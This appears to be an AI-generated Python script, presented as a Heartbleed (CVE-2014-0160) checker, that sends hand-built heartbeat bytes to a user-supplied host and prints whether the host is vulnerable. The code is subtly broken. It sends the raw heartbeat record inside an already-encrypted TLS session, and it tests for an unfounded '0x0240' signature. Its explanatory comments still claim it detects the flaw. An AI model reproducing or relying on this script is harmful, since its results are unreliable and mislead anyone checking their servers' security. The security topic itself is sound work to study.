
# Here's another example that checks for the Heartbleed vulnerability (CVE-2014-0160) in a target server using the `ssl` library in Python:

import ssl
import socket

def check_heartbleed_vulnerability(host, port):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, port)) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.sendall(b"\x18\x03\x02\x00\x03\x01\x40\x00")
                response = ssock.recv(1024)
                if b"\x02\x40" in response:
                    print("The target is vulnerable to Heartbleed (CVE-2014-0160)")
                else:
                    print("The target is not vulnerable to Heartbleed (CVE-2014-0160)")
    except Exception as e:
        print(f"Error occurred: {e}")

def main():
    target_host = input("Enter the target host to check for Heartbleed vulnerability: ")
    target_port = int(input("Enter the target port to check for Heartbleed vulnerability (default is 443): ") or "443")
    check_heartbleed_vulnerability(target_host, target_port)

if __name__ == "__main__":
    main()

# This script connects to the specified host and port and sends a Heartbeat request to the server. If the server is vulnerable to Heartbleed, it will respond with a Heartbeat response containing leaked memory data. The script checks if the response contains the Heartbleed signature `0x0240` and prints the appropriate message indicating whether the server is vulnerable or not.

# To use this script, run it and provide the target host and port when prompted. The default port is 443, which is commonly used for HTTPS connections.

